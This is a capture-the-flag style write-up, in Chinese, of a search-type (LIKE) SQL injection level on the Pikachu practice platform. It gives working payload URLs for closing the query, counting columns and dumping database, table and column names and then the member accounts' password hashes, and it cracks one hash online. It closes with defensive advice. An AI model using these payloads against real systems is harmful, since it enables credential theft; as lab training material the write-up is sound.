【Pikachu】Web-SQL-Inject 搜索型注入 Writeup

操作者：何芊宏 | 操作日期：2026.9.27 | 分类：Pikachu | 标签：Pikachu, Web, SQL注入, 搜索型注入, LIKE注入, GET注入, union select, cmd5

1. 题目信息

  • 平台：Pikachu 漏洞练习平台
  • 分类：Web - SQL-Inject
  • 题目名称：搜索型注入
  • 目标：利用GET请求中模糊搜索（LIKE）参数产生的SQL注入漏洞，闭合百分号与单引号，获取数据库中的管理员账号和密码。

2. 解题思路与知识点

漏洞原理：

搜索型注入本质上是字符型注入的一种变形。后端程序在处理搜索功能时，通常使用 LIKE 语句进行模糊匹配，SQL 语句类似于 SELECT * FROM users WHERE username LIKE '%$name%'。因为变量被百分号（%）和单引号（'）包裹，攻击者在构造 Payload 时，必须闭合前面的 % 和 '，然后再使用注释符（如 --+）注释掉后面的 % 和 '，从而使得注入的逻辑控制生效。

工具选型与心路历程：
  • F12抓包与地址栏注入：由于该关卡为GET请求，参数直接暴露在URL中。通过F12抓包明确请求参数名为 name，随后在浏览器地址栏手工构造URL进行注入测试。
  • 闭合技巧（%'）：与单纯的字符型注入（如 vince'）不同，搜索型注入需要闭合LIKE语句特有的百分号，所以尝试使用 vince%' 闭合前部的 % 和 '，从而触发SQL报错。
  • 联合查询提取数据：利用 UNION SELECT 结合 information_schema 元数据库，逐层获取库名、表名、列名，最终提取账号与密码哈希。
  • MD5解密：获取到MD5哈希后，利用cmd5.com在线网站进行反向查询，还原明文密码。

3. 操作步骤

第一步：抓包与参数分析

操作：在页面输入框输入 vince，点击“搜索”。按F12打开开发者工具，切换到网络（Network）标签页，观察抓到的请求。

分析结果：URL为 http://127.0.0.1/pikachu/vul/sqli/sqli_search.php?name=vince&submit=搜索。确认请求方式为GET，参数名为 name。

第二步：漏洞探测（单引号与闭合测试）

1. 单引号测试：在地址栏输入 name=vince' 访问。

回显：页面抛出数据库报错：You have an error in your SQL syntax; check the manual... near '%' at line 1。

说明：报错信息中的 near '%' 证实了后端SQL语句为 LIKE '%$name%' 形式，且单引号未被过滤。

2. 布尔逻辑测试（使用 %' 闭合）：

测试真条件： ?name=vince%' and 1=1 --+&submit=搜索

回显：页面正常显示 `vince` 的账号信息（`uid:1`, `email: hacker@hacked.com`）。

测试假条件： ?name=vince%' and 1=2 --+&submit=搜索

回显：页面提示“没有搜索到你输入的信息！”。

说明：证明 %' 成功闭合了前端的百分号和单引号，且逻辑控制生效，漏洞存在。

第三步：探测字段数（ORDER BY）

操作：在地址栏依次测试 order by 递增数字：

输入： ?name=vince%' order by 3 --+&submit=搜索

回显：页面正常显示 `vince` 的信息。

输入： ?name=vince%' order by 4 --+&submit=搜索

回显：页面报错 Unknown column '4' in 'order clause'。

说明：推断后端SQL语句查询了 3 个字段。

第四步：联合查询获取数据（UNION SELECT）

操作：利用联合查询，逐步获取库名、表名、列名及账号密码。

1. 确认回显位置：

输入： ?name=vince%' union select 1,2,3 --+&submit=搜索

回显：页面显示 `username: vince` / `uid: 1` / `email is: hacker@hacked.com` 以及注入结果 `username: 1` / `uid: 2` / `email is: 3`。确定第 3 个字段（对应 email 位置）为回显点。

2. 查库名：

输入： ?name=vince%' union select 1,2,database() --+&submit=搜索

回显： email is: pikachu，库名为 pikachu。

3. 查表名：

输入： ?name=vince%' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='pikachu' --+&submit=搜索

回显： email is: httpinfo,member,message,users,xssblind。锁定目标表为 member。

4. 查列名：

输入： ?name=vince%' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='member' and table_schema='pikachu' --+&submit=搜索

回显： email is: id,username,pw,sex,phonenum,address,email。确认账号和密码字段为 username 和 pw。

5. 爆账号密码：

输入： ?name=vince%' union select 1,2,group_concat(concat(username, ':', pw)) from member --+&submit=搜索

回显： email is: vince:e10adc3949ba59abbe56e057f20f883e,allen:e10adc3949ba59abbe56e057f20f883e,...，成功获取所有账号及其对应的MD5密码哈希值。

第五步：解密与验证

操作： 将提取到的哈希值 e10adc3949ba59abbe56e057f20f883e 粘贴到 cmd5.com 进行查询。

回显： 查询结果显示明文密码为 123456。

说明：证明后端使用了 MD5 加密且未加盐，且用户使用了极弱口令。

4. 踩坑记录与复盘

  • 坑1：搜索型注入特有的闭合方式。直接用 vince' 会导致 LIKE '%vince'%' 报错。必须使用 vince%' 才能同时闭合前面的 % 和 '，并保留注释符 --+ 来截断后面的 %'。
  • 坑2：URL 自动编码。在浏览器地址栏直接输入 Payload 时，空格、单引号、井号等字符会被浏览器自动编码（如 %27、%20）。这是正常现象，后端 PHP 会自动解码，但应确保注释符 --+ 被完整输入。
  • 坑3：字段数与前两关不同。该关卡后端是 SELECT *，查询了 member 表的全字段，因此推断出的字段数为 3，而之前的关卡由于具体代码差异，字段数为 2。

5. 知识总结

  • 搜索型注入核心：后端使用 LIKE 模糊查询时，变量被 % 和 ' 包裹，Payload 必须包含 %' 来闭合，并使用注释符截断后续语句。
  • UNION 联合查询：在知道字段数后，利用 UNION SELECT 结合 information_schema 数据库，按照“库 -> 表 -> 列 -> 数据”的顺序逐层提取，实现完整的“脱库”攻击。
  • 防御建议：严格使用预编译语句（Prepared Statements）或参数化查询，确保参数与SQL语句代码分离；对用户输入进行严格的过滤和转义；对密码使用加盐的强哈希算法（如 bcrypt）进行存储。
